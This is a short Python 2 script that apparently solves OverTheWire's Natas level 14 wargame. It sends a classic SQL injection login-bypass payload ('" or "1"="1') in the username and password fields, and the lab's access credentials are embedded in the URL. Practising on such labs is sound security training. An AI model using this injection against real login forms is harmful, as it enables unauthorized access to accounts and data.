import requests

target = 'http://natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1@natas14.natas.labs.overthewire.org/index.php'

payload = {'username':'admin" or "1"="1','password':'admin" or "1"="1','submit':'Login'}

r = requests.post(target,data=payload)
if r.status_code != requests.codes.ok :
	print 'Unable to Connect'
else :
	print 'Connected'

print r.text